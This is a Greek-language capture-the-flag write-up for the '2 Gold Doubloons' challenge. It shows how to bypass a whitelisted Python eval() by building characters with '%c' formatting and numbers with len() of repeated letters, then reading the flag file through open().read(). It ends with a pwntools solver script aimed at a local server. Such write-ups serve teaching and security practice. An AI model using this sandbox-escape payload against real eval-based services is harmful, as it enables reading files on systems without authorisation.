## 2 Gold Doubloons writeup

| Δοκιμασία | 2 Gold Doubloons |
| :------- | :----- |
| Δυσκολία | Δύσκολη |
| Κατηγορία | Διάφορα (Miscellaneous) |
| Λύσεις | 14 |
| Πόντοι | 389 |

### Περιγραφή Δοκιμασίας

H περιγραφή της δοκιμασία (`Όχι 1... 2`) δεν μας βοηθάει... Κοιτάζοντας τα αρχεία βλέπουμε πως έχουμε:
 - requirements.txt - αρχείο με βιβλιοθήκες που χρειάζονται
 - server.py - αρχείο με τον κώδικα που τρέχει στον server

Παράλληλα μας δίνεται πως το αρχείο που έχει το flag ονομάζεται `S3cr3t_Fl4g.txt`.

Από την ανάλυση του κώδικα, βλέπουμε πως έχουμε ένα whitelisted `eval()` με έλεγχο εισόδου (input sanitization).

```python
# Awwwww no flag? :'( 
whitelist = "e.d',no)p(a%rcl"
 
# Awwww input sanitization :'( 
Anti_Cheating = lambda check: any(c not in whitelist for c in check)

# Awww spongebob reference :'( 
def Magic_Conch_shell():
	Ev4l_m3_pL3a5e = input("Oh magic conch shell > ")
	if Anti_Cheating(Ev4l_m3_pL3a5e):
		print('Th3 Sh3ll h45 Sp0k3n: Nothing!')
		exit()
	print(f'Th3 Sh3ll h45 Sp0k3n: {eval(Ev4l_m3_pL3a5e)}')

while True:
	Magic_Conch_shell()
```

## Στόχος

Ο στόχος φαίνεται να είναι να καταφέρουμε να εκτελέσουμε κώδικα Python με την χρήση του `eval`. Ωστόσο, για να το καταφέρουμε αυτό θα πρέπει να ξεπεράσουμε το `Anti_Cheating`, το οποίο μας αφήνει να χρησιμοποιήσουμε μόνο μερικούς χαρακτήρες (whitelist):

```python
whitelist = "e.d',no)p(a%rcl"
```

Που σημαίνει πως:

 - Δεν μπορούμε να χρησιμοποιήσουμε χαρακτήρες αλφάβητου πέρα από `a`, `c`, `d`, `e`, `l`, `n`, `o`, `p`, `r`.
 - Δεν έχουμε πρόσβαση σε ειδικούς χαρακτήρες εκτός από `.`, `'`, `,`, `)`, `(`, `%`.


### Στρατηγική Εκμετάλλευσης Αδυναμιών

Ο στόχος μας είναι να βρούμε ένα τρόπο να κωδικοποιούμε οποιοδήποτε κώδικα θέλουμε με την χρήση συμβόλων εντός των περιορισμών του `Anti_Cheating`.

Μπορούμε να χρησιμοποιούμε τη μορφοποίηση συμβολοσειρών της Python με `%c`, η οποία μας επιτρέπει να κατασκευάσουμε χαρακτήρες με βάση τους ASCII αριθμούς τους, για παράδειγμα:

```python
'%c%c%c' % (65, 66, 67) # ABC
```

Δυστυχώς δεν μπορούμε να χρησιμοποιήσουμε αριθμούς. Αλλά, με την χρήση του `len('aaaa...')`, μπορούμε να κατασκευάσουμε ακέραιους αριθμούς, για παράδειγμα:

```python
'%c%c%c' % (len('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), len('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'), len('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')) # ABC
```

Τέλος, μπορούμε να διαβάσουμε αρχεία με την χρήση του:
```python
open('<filename-here>').read()
```

### Λύση (Solver Script)

Συνδυάζοντας όλα τα παραπάνω μαζί και με την χρήση των pwntools (για την επικοινωνία με τον server) σε ένα script:

```python
from pwn import *

r = remote("127.0.0.1","1337")

whitelist = 'e")n%(,lc'

target = "S3cr3t_Fl4g.txt"

payload = f"'{'%c'*len(target)}'%("
for char in target:
	payload += f"len('{ord(char)*'e'}'),"

final = f"open({payload[:-1]})).read()"
r.sendlineafter(b"> ", final.encode())
print(r.recvline().decode().strip())
```
